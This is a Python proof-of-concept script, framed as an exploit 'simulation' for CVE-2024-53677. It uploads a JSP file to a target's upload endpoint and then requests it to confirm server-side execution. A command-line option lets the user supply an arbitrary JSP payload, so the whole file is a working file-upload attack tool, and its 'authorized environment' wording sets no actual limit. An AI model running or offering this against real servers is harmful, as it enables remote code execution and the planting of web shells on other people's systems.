import requests
import argparse
import sys
from urllib.parse import urljoin

def simulate_exploit(target_url, upload_path, file_name="exploit.jsp", payload=None):
    """
    Simulates an exploit attempt for CVE-2024-53677 in an authorized environment.
    """
    if not payload:
        payload = """<% out.println("Exploit test successful!"); %>"""

    upload_url = urljoin(target_url, upload_path)
    malicious_file = (file_name, payload, 'application/octet-stream')

    print(f"[INFO] Target URL: {target_url}")
    print(f"[INFO] Attempting file upload to: {upload_url}")

    files = {'file': malicious_file}

    try:
        # Sending the malicious file
        response = requests.post(upload_url, files=files, timeout=15)

        if response.status_code == 200:
            print("[INFO] File uploaded successfully, attempting verification...")
            verify_payload(target_url, file_name)
        elif response.status_code in [401, 403]:
            print(f"[WARNING] Access Denied (HTTP {response.status_code}). Ensure you have proper permissions.")
        else:
            print(f"[INFO] File upload failed. HTTP Status Code: {response.status_code}")
            print(f"[DEBUG] Response Content: {response.text[:200]}")  # Print first 200 characters of response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Exploit simulation failed: {e}")

def verify_payload(target_url, file_name):
    """
    Verifies if the uploaded payload is executable on the target server.
    """
    payload_url = urljoin(target_url, file_name)

    print(f"[INFO] Verifying payload execution at: {payload_url}")

    try:
        response = requests.get(payload_url, timeout=10)
        if response.status_code == 200 and "Exploit test successful!" in response.text:
            print(f"[ALERT] Exploit successful! Payload executed at: {payload_url}")
        elif response.status_code == 404:
            print("[INFO] Payload not found on the server. Target may be secure or upload failed.")
        else:
            print(f"[INFO] Unexpected HTTP response: {response.status_code}")
            print(f"[DEBUG] Response Content: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="PoC Exploit Simulation for CVE-2024-53677")
    parser.add_argument("target_url", help="Target base URL (e.g., http://example.com)")
    parser.add_argument("upload_path", help="Path for file upload endpoint (e.g., /upload)")
    parser.add_argument("--file_name", default="exploit.jsp", help="Name of the malicious file (default: exploit.jsp)")
    parser.add_argument("--payload", help="Custom payload to upload (default: JSP code to print success message)")
    args = parser.parse_args()

    print("[INFO] Starting PoC Exploit Simulation...")
    simulate_exploit(args.target_url, args.upload_path, args.file_name, args.payload)
    print("[INFO] Simulation completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[INFO] Execution interrupted by user.")
        sys.exit(0)
